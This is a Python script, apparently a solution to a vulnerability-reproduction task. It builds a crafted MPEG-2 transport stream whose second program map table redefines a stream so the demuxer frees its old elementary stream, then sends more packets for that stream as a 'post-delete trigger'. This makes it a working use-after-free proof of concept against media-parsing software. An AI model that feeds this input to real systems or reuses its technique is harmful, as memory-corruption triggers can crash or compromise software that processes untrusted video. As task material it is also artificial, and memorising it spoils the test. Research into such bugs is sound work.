import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Precompute CRC32 table for MPEG-2 (Poly 0x04C11DB7)
        crc_table = []
        poly = 0x04C11DB7
        for i in range(256):
            crc = i << 24
            for _ in range(8):
                if crc & 0x80000000:
                    crc = (crc << 1) ^ poly
                else:
                    crc = (crc << 1)
            crc_table.append(crc & 0xFFFFFFFF)

        def mpeg_crc32(data):
            crc = 0xFFFFFFFF
            for byte in data:
                crc = ((crc << 8) ^ crc_table[((crc >> 24) ^ byte) & 0xFF]) & 0xFFFFFFFF
            return crc

        def make_packet(pid, payload, counter, pusi=0):
            header = 0x47000000
            header |= (pusi & 1) << 22
            header |= (pid & 0x1FFF) << 8
            header |= (counter & 0x0F)
            
            needed_stuffing = 184 - len(payload)
            if needed_stuffing > 0:
                header |= 0x30 # Adapt + Payload
                adapt_len = needed_stuffing - 1
                adapt_field = struct.pack("B", adapt_len)
                if adapt_len > 0:
                    adapt_field += b'\x00' + b'\xFF' * (adapt_len - 1)
                pkt = struct.pack(">I", header) + adapt_field + payload
            else:
                header |= 0x10 # Payload only
                pkt = struct.pack(">I", header) + payload[:184]
            # Ensure exactly 188 bytes
            return pkt + b'\xFF' * (188 - len(pkt))

        packets = []
        
        # Packet 1: PAT (PID 0)
        # Program 1 -> PID 0x100
        pat_content = struct.pack(">H", 1) + struct.pack("B", 0xC1) + b'\x00\x00'
        pat_content += struct.pack(">H", 1) + struct.pack(">H", 0xE100)
        pat_section = b'\x00' + struct.pack(">H", 0xB00D) + pat_content
        pat_section += struct.pack(">I", mpeg_crc32(pat_section))
        packets.append(make_packet(0, b'\x00' + pat_section, 0, pusi=1))
        
        # Packet 2: PMT (PID 0x100) - Version 0
        # Define Stream 0x200 (Video)
        pmt_base = struct.pack(">H", 1) + struct.pack("B", 0xC1) + b'\x00\x00'
        pmt_base += struct.pack(">H", 0xE200) + struct.pack(">H", 0xF000)
        pmt_streams = b'\x01' + struct.pack(">H", 0xE200) + struct.pack(">H", 0xF000)
        pmt_section = b'\x02' + struct.pack(">H", 0xB012) + pmt_base + pmt_streams
        pmt_section += struct.pack(">I", mpeg_crc32(pmt_section))
        packets.append(make_packet(0x100, b'\x00' + pmt_section, 0, pusi=1))
        
        # Packet 3: Data for PID 0x200
        packets.append(make_packet(0x200, b'\x00\x00\x01\xB3' + b'\x11'*100, 0))
        
        # Packet 4: PMT (PID 0x100) - Version 1 (Update)
        # Change Stream 0x200 type to Audio (0x02) to force deletion of previous ES
        pmt_base_v1 = struct.pack(">H", 1) + struct.pack("B", 0xC3) + b'\x00\x00'
        pmt_base_v1 += struct.pack(">H", 0xE200) + struct.pack(">H", 0xF000)
        pmt_streams_v1 = b'\x02' + struct.pack(">H", 0xE200) + struct.pack(">H", 0xF000)
        pmt_section_v1 = b'\x02' + struct.pack(">H", 0xB012) + pmt_base_v1 + pmt_streams_v1
        pmt_section_v1 += struct.pack(">I", mpeg_crc32(pmt_section_v1))
        packets.append(make_packet(0x100, b'\x00' + pmt_section_v1, 1, pusi=1))
        
        # Packet 5: Data for PID 0x200 (post-delete trigger)
        packets.append(make_packet(0x200, b'\xFF'*100, 1))
        
        # Packet 6: Filler
        packets.append(make_packet(0x200, b'\xFE'*100, 2))
        
        return b''.join(packets)